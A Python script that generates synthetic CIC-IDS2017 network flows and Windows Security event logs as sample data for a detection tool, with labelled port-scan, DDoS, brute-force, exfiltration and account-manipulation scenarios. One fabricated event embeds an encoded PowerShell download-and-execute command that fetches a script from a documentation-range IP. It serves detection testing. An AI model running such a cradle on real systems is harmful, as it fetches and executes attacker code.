#!/usr/bin/env python3
"""Generate small, reproducible sample datasets in the *exact schemas* of two
public security datasets, so ThreatLens runs out of the box without a multi-GB
download:

  * cicids2017_sample.csv  - CIC-IDS2017 "GeneratedLabelledFlows" (TrafficLabelling)
                             CSV schema, CICFlowMeter column names incl. the
                             leading spaces the real files have.
  * windows_security_sample.jsonl - OTRF Security-Datasets style Windows Security
                             event log records (one JSON object per line).

Attack scenarios mirror what is in the real datasets (PortScan, DDoS LOIT,
SSH/FTP-Patator from the CIC attacker subnet; brute force, password spray,
encoded PowerShell, account manipulation and log clearing on Windows).

To use the real datasets instead, see data/download_datasets.sh.
"""
import base64
import csv
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(2017)
OUT = Path(__file__).parent / "sample"
OUT.mkdir(exist_ok=True)

# ---------------------------------------------------------------- CIC-IDS2017
CIC_COLUMNS = [
    "Flow ID", " Source IP", " Source Port", " Destination IP", " Destination Port",
    " Protocol", " Timestamp", " Flow Duration", " Total Fwd Packets",
    " Total Backward Packets", "Total Length of Fwd Packets",
    " Total Length of Bwd Packets", " Fwd Packet Length Max", " Fwd Packet Length Mean",
    "Bwd Packet Length Max", " Bwd Packet Length Mean", "Flow Bytes/s", " Flow Packets/s",
    " Flow IAT Mean", "FIN Flag Count", " SYN Flag Count", " RST Flag Count",
    " PSH Flag Count", " ACK Flag Count", " Average Packet Size", "Init_Win_bytes_forward",
    " Init_Win_bytes_backward", " Label",
]

VICTIM_WEB = "192.168.10.50"      # Ubuntu web server in the real CIC testbed
ATTACKER_NAT = "172.16.0.1"       # attacker traffic seen through the firewall NAT
ATTACKER_EXT = "205.174.165.73"   # Kali attacker in the real CIC testbed
CLIENTS = [f"192.168.10.{i}" for i in (3, 5, 8, 9, 12, 14, 15, 16, 17, 19, 25)]
EXTERNAL = ["23.194.142.15", "72.21.91.29", "104.16.207.165", "172.217.10.98",
            "151.101.1.69", "52.84.150.39", "8.8.8.8", "192.168.10.3"]
DAY = datetime(2017, 7, 7, 8, 0, 0)


def ts(dt: datetime) -> str:
    # the real files use d/M/yyyy H:mm:ss style local timestamps
    return f"{dt.day}/{dt.month}/{dt.year} {dt.hour}:{dt.minute:02d}:{dt.second:02d}"


def flow(src, sport, dst, dport, proto, when, dur_us, fwd, bwd, fwd_len, bwd_len,
         syn=0, fin=0, rst=0, psh=0, ack=0, label="BENIGN", win_f=29200, win_b=-1):
    dur = max(dur_us, 1)
    pkts = fwd + bwd
    total = fwd_len + bwd_len
    return {
        "Flow ID": f"{dst}-{src}-{dport}-{sport}-{proto}",
        " Source IP": src, " Source Port": sport, " Destination IP": dst,
        " Destination Port": dport, " Protocol": proto, " Timestamp": ts(when),
        " Flow Duration": dur, " Total Fwd Packets": fwd, " Total Backward Packets": bwd,
        "Total Length of Fwd Packets": fwd_len, " Total Length of Bwd Packets": bwd_len,
        " Fwd Packet Length Max": (fwd_len // max(fwd, 1)) * 2 if fwd else 0,
        " Fwd Packet Length Mean": round(fwd_len / max(fwd, 1), 3),
        "Bwd Packet Length Max": (bwd_len // max(bwd, 1)) * 2 if bwd else 0,
        " Bwd Packet Length Mean": round(bwd_len / max(bwd, 1), 3),
        "Flow Bytes/s": round(total / (dur / 1e6), 3),
        " Flow Packets/s": round(pkts / (dur / 1e6), 3),
        " Flow IAT Mean": round(dur / max(pkts - 1, 1), 3),
        "FIN Flag Count": fin, " SYN Flag Count": syn, " RST Flag Count": rst,
        " PSH Flag Count": psh, " ACK Flag Count": ack,
        " Average Packet Size": round(total / max(pkts, 1), 3),
        "Init_Win_bytes_forward": win_f, " Init_Win_bytes_backward": win_b,
        " Label": label,
    }


def benign_flows(n):
    rows = []
    for _ in range(n):
        when = DAY + timedelta(seconds=random.uniform(0, 4 * 3600))
        src = random.choice(CLIENTS)
        kind = random.random()
        if kind < 0.55:   # HTTPS browsing
            dst, dport, proto = random.choice(EXTERNAL[:6]), 443, 6
            fwd, bwd = random.randint(6, 40), random.randint(6, 60)
            fl, bl = fwd * random.randint(60, 400), bwd * random.randint(200, 1400)
            dur = random.randint(50_000, 30_000_000)
            r = flow(src, random.randint(49152, 65535), dst, dport, proto, when, dur, fwd, bwd,
                     fl, bl, syn=0, fin=1, psh=1, ack=1, win_f=random.choice([8192, 29200, 65535]),
                     win_b=random.choice([235, 1024, 28960]))
        elif kind < 0.80:  # DNS
            dur = random.randint(200, 90_000)
            r = flow(src, random.randint(49152, 65535), "192.168.10.3", 53, 17, when, dur, 1, 1,
                     random.randint(30, 70), random.randint(60, 300), win_f=-1)
        elif kind < 0.93:  # HTTP to internal web server (legit users)
            fwd, bwd = random.randint(4, 12), random.randint(3, 10)
            dur = random.randint(5_000, 5_000_000)
            r = flow(src, random.randint(49152, 65535), VICTIM_WEB, 80, 6, when, dur, fwd, bwd,
                     fwd * random.randint(80, 500), bwd * random.randint(300, 1460),
                     fin=1, psh=1, ack=1, win_b=235)
        else:  # occasional legit SSH admin session
            fwd, bwd = random.randint(20, 200), random.randint(20, 200)
            dur = random.randint(10_000_000, 600_000_000)
            r = flow("192.168.10.8", random.randint(49152, 65535), VICTIM_WEB, 22, 6, when, dur,
                     fwd, bwd, fwd * random.randint(40, 120), bwd * random.randint(40, 200),
                     fin=1, psh=1, ack=1)
        rows.append(r)
    return rows


def portscan():
    rows, start = [], DAY + timedelta(hours=2, minutes=12)
    ports = random.sample(range(1, 10000), 640)
    for i, p in enumerate(ports):
        when = start + timedelta(milliseconds=i * 140)
        rows.append(flow(ATTACKER_NAT, random.randint(40000, 65000), VICTIM_WEB, p, 6, when,
                         random.randint(20, 120), 1, 1, 0, 6, syn=1, rst=1,
                         win_f=1024, win_b=0, label="PortScan"))
    return rows


def ddos():
    rows, start = [], DAY + timedelta(hours=3, minutes=1)
    for i in range(900):
        when = start + timedelta(milliseconds=i * 110)
        fwd = random.randint(3, 8)
        rows.append(flow(ATTACKER_NAT, random.randint(1024, 65000), VICTIM_WEB, 80, 6, when,
                         random.randint(500, 90_000), fwd, random.randint(0, 4),
                         fwd * random.randint(0, 20), random.randint(0, 2000), syn=1, psh=1, ack=1,
                         win_f=256, win_b=235, label="DDoS"))
    return rows


def patator(port, label, start, n):
    rows = []
    for i in range(n):
        when = start + timedelta(seconds=i * 1.6 + random.uniform(0, 0.4))
        fwd, bwd = random.randint(9, 14), random.randint(10, 16)
        rows.append(flow(ATTACKER_EXT, random.randint(40000, 65000), VICTIM_WEB, port, 6, when,
                         random.randint(1_000_000, 4_500_000), fwd, bwd, fwd * random.randint(50, 90),
                         bwd * random.randint(60, 110), fin=1, psh=1, ack=1, win_f=29200,
                         win_b=247, label=label))
    return rows


def exfiltration():
    """Low-volume exfil over an odd port. No signature rule covers it; the ML model should."""
    rows, start = [], DAY + timedelta(hours=3, minutes=38)
    for i in range(18):
        when = start + timedelta(seconds=i * 13 + random.uniform(0, 3))
        fwd = random.randint(700, 1400)
        rows.append(flow("192.168.10.25", random.randint(49152, 65535), "185.220.101.5", 4444, 6, when,
                         random.randint(8_000_000, 20_000_000), fwd, random.randint(40, 90),
                         fwd * random.randint(1300, 1460), random.randint(2000, 5000), psh=1, ack=1,
                         win_f=64240, win_b=502, label="Infiltration"))
    return rows


def it_scanner():
    """Benign-but-noisy: IT asset discovery probing a workstation. Rules fire; analyst closes as benign."""
    rows, start = [], DAY + timedelta(hours=1, minutes=40)
    for i, p in enumerate([21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1723,
                           3306, 3389, 5900, 8080, 8443, 9100, 5985, 5986, 161, 389, 636]):
        rows.append(flow("192.168.10.8", random.randint(40000, 65000), "192.168.10.9", p, 6,
                         start + timedelta(milliseconds=i * 900), random.randint(50, 900), 2, 1, 0, 0,
                         syn=1, rst=1, win_f=1024, win_b=0))
    return rows


def write_cic():
    rows = benign_flows(2600) + portscan() + ddos() + exfiltration() + it_scanner()
    rows += patator(22, "SSH-Patator", DAY + timedelta(hours=1, minutes=5), 110)
    rows += patator(21, "FTP-Patator", DAY + timedelta(minutes=35), 80)
    rows.sort(key=lambda r: datetime.strptime(r[" Timestamp"], "%d/%m/%Y %H:%M:%S"))
    path = OUT / "cicids2017_sample.csv"
    with path.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=CIC_COLUMNS)
        w.writeheader()
        w.writerows(rows)
    print(f"wrote {len(rows)} flows -> {path}")


# ------------------------------------------------------------ Windows (OTRF)
WIN_DAY = datetime(2020, 9, 21, 9, 0, 0)
USERS = ["jdoe", "asmith", "bwayne", "ckent", "dprince", "pparker", "tstark", "nromanoff",
         "srogers", "bbanner", "hpotts", "lluthor", "mmurdock", "jjones", "fcastle", "wwilson"]
HOSTS = ["WKS-042", "WKS-017", "WKS-008", "FIN-SRV01", "DC01", "FILE-SRV02"]
DOMAIN = "THREATLENS"


def win(when, event_id, host, **kw):
    rec = {
        "@timestamp": when.strftime("%Y-%m-%dT%H:%M:%S.") + f"{when.microsecond // 1000:03d}Z",
        "Hostname": f"{host}.threatlens.local", "Channel": "Security",
        "SourceName": "Microsoft-Windows-Security-Auditing", "EventID": event_id,
    }
    rec.update(kw)
    return rec


def logon_ok(when, user, host, ip, ltype=3):
    return win(when, 4624, host, TargetUserName=user, TargetDomainName=DOMAIN, LogonType=ltype,
               IpAddress=ip, WorkstationName=host, AuthenticationPackageName="Kerberos" if ltype == 3 else "Negotiate")


def logon_fail(when, user, host, ip, status="0xc000006d", sub="0xc000006a", ltype=3):
    return win(when, 4625, host, TargetUserName=user, TargetDomainName=DOMAIN, LogonType=ltype,
               IpAddress=ip, Status=status, SubStatus=sub, FailureReason="%%2313",
               WorkstationName="", AuthenticationPackageName="NTLM")


def write_windows():
    ev = []
    # benign: logons through a work day, a few fat-fingered passwords
    for _ in range(520):
        when = WIN_DAY + timedelta(seconds=random.uniform(0, 8 * 3600))
        user = random.choice(USERS)
        ip = f"10.0.1.{random.randint(10, 80)}"
        ev.append(logon_ok(when, user, random.choice(HOSTS), ip, random.choice([2, 3, 3, 3, 10])))
        if random.random() < 0.06:
            ev.append(logon_fail(when - timedelta(seconds=8), user, random.choice(HOSTS), ip))
    for _ in range(140):
        when = WIN_DAY + timedelta(seconds=random.uniform(0, 8 * 3600))
        host = random.choice(HOSTS[:3])
        proc = random.choice([r"C:\Windows\System32\svchost.exe", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                              r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Windows\System32\notepad.exe"])
        ev.append(win(when, 4688, host, SubjectUserName=random.choice(USERS), NewProcessName=proc,
                      CommandLine=f'"{proc}"', ParentProcessName=r"C:\Windows\explorer.exe"))

    # noise: a user who forgot their password and got locked out (no success afterwards)
    t = WIN_DAY + timedelta(hours=1, minutes=3)
    for i in range(6):
        ev.append(logon_fail(t + timedelta(seconds=i * 14), "ckent", "WKS-017", "10.0.1.33", ltype=2))
    # noise: helpdesk grants RDP access through a normal change
    ev.append(win(WIN_DAY + timedelta(hours=3, minutes=12), 4732, "FILE-SRV02", SubjectUserName="helpdesk01",
                  MemberName="CN=hpotts", TargetUserName="Remote Desktop Users", TargetDomainName="Builtin"))

    # 1) brute force against FIN-SRV01 then success (T1110.001 -> T1078)
    t = WIN_DAY + timedelta(hours=2, minutes=14)
    for i in range(14):
        ev.append(logon_fail(t + timedelta(seconds=i * 6), "administrator", "FIN-SRV01", "10.0.5.66"))
    ev.append(logon_ok(t + timedelta(seconds=14 * 6 + 3), "administrator", "FIN-SRV01", "10.0.5.66", 3))

    # 2) password spray against the DC (T1110.003) - slow, 1 attempt per user
    t = WIN_DAY + timedelta(hours=4, minutes=2)
    for i, user in enumerate(USERS[:15]):
        ev.append(logon_fail(t + timedelta(seconds=i * 40), user, "DC01", "10.0.5.77",
                             sub="0xc000006a"))

    # 3) Office macro spawning encoded PowerShell (T1059.001)
    t = WIN_DAY + timedelta(hours=5, minutes=31)
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a.ps1')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    ev.append(win(t, 4688, "WKS-042", SubjectUserName="jdoe",
                  NewProcessName=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  CommandLine=f"powershell.exe -nop -w hidden -enc {enc}",
                  ParentProcessName=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"))

    # 4) account created then added to Administrators (T1136.001 / T1098)
    t = WIN_DAY + timedelta(hours=5, minutes=44)
    ev.append(win(t, 4720, "WKS-042", SubjectUserName="jdoe", TargetUserName="svc_backup2",
                  TargetDomainName="WKS-042"))
    ev.append(win(t + timedelta(minutes=2), 4732, "WKS-042", SubjectUserName="jdoe",
                  MemberName="CN=svc_backup2", TargetUserName="Administrators",
                  TargetDomainName="Builtin", MemberSid="S-1-5-21-1-1-1-1013"))

    # 5) security log cleared (T1070.001)
    ev.append(win(t + timedelta(minutes=9), 1102, "WKS-042", SubjectUserName="jdoe",
                  Channel="Security"))

    ev.sort(key=lambda r: r["@timestamp"])
    path = OUT / "windows_security_sample.jsonl"
    with path.open("w") as f:
        for r in ev:
            f.write(json.dumps(r) + "\n")
    print(f"wrote {len(ev)} events -> {path}")


if __name__ == "__main__":
    write_cic()
    write_windows()
